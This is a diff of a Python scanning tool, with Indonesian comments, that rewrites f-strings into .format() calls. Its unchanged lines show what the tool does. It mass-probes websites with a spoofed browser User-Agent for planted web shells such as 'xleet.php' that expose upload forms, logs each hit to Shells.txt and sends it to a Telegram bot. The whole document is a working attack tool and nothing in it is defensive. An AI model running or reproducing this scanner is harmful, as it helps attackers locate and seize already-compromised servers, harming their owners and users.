@@ -6,12 +6,12 @@ required_libraries = ['requests', 'python-telegram-bot']
 
 # Fungsi untuk memeriksa dan menginstal pustaka yang diperlukan
 def install_missing_libraries():
-    installed_libraries = subprocess.check_output([sys.executable, '-m', 'pip', 'list']).decode('utf-8')
+    installed_libraries = subprocess.Popen([sys.executable, '-m', 'pip', 'list'], stdout=subprocess.PIPE).communicate()[0]
     for library in required_libraries:
         if library not in installed_libraries:
-            print(f'Missing library: {library}. Installing...')
-            subprocess.check_call([sys.executable, '-m', 'pip', 'install', library])
-            print(f'{library} installed successfully.')
+            print('Missing library: {}. Installing...'.format(library))
+            subprocess.call([sys.executable, '-m', 'pip', 'install', library])
+            print('{} installed successfully.'.format(library))
 
 # Memanggil fungsi untuk memeriksa dan menginstal pustaka yang diperlukan
 install_missing_libraries()
@@ -19696,7 +19696,7 @@ files = ['xleet.php',
 def v(url, p='http'):
     for dir in dirs:
         for file in files:
-            yield f'{p}://{url}{dir}/{file}'
+            yield '{}://{}{}/{}'.format(p, url, dir, file)
 
 def c(u):
     try:
@@ -19706,21 +19706,21 @@ def c(u):
                 try:
                     r = rq.get(s, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0'}, timeout=10)
                     if 'type="submit" value="upload"' in r.text or 'type="submit" value="submit"' in r.text or 'type="file" name="gecko-upload"' in r.text:
-                        print(f'Found      {s}')
+                        print('Found      {}'.format(s))
                         with open('Shells.txt', 'a') as f:
-                            f.write(f'{s}\n')
+                            f.write('{}\n'.format(s))
                         send_telegram_message(s)  # Kirim pesan ke Telegram
                         return
                 except Exception as e:
-                    print(f'Error occurred while processing {s}: {e}')
+                    print('Error occurred while processing {}: {}'.format(s, e))
                     continue
-        print(f'Not Found {u}')
+        print('Not Found {}'.format(u))
     except Exception as e:
-        print(f'Error occurred while processing {u}: {e}')
+        print('Error occurred while processing {}: {}'.format(u, e))
 
 def send_telegram_message(message):
     bot = Bot(token=TELEGRAM_BOT_TOKEN)
-    formatted_message = f"===========--Result Shell--===========\n{message}\n===========--Result Shell--==========="
+    formatted_message = "===========--Result Shell--===========\n{}\n===========--Result Shell--===========".format(message)
     bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=formatted_message)
 
 def bn():
@@ -19741,7 +19741,7 @@ def m():
             return
         
         f = sys.argv[1]
-        with open(f, 'r', errors='ignore') as fl:
+        with open(f, 'r') as fl:
             urls = fl.read().splitlines()
 
         if not urls:
@@ -19751,7 +19751,7 @@ def m():
         pool = pl(100)
         pool.map(c, urls)
 
-    except FileNotFoundError:
+    except IOError:
         print("File not found.")
 
 if __name__ == "__main__":
